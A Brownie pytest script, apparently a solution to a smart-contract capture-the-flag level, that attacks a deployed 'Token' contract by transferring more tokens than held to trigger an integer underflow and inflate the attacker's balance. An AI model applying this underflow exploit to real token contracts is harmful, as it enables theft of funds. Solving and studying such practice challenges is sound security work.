import pytest
from brownie import Token, Telephone, network, config, accounts, Contract

account = accounts.add(config["wallets"]["from_key"])
account2 = accounts.add(config["wallets"]["from_key2"])


def test_attack_token():
    contract = Contract.from_abi(
        Token._name, config["networks"][network.show_active(
        )]["contract_addr"], Token.abi
    )

    #overflow_num = (2 ** 256) - 21
    tx = contract.transfer(account2, 21, {"from": account})
    tx.wait(1)
    assert contract.balanceOf(account) > 0
    assert contract.balanceOf(account2) == 0

    print(f"balance of account: {contract.balanceOf(account)}")
    print(f"balance of account2: {contract.balanceOf(account2)}")
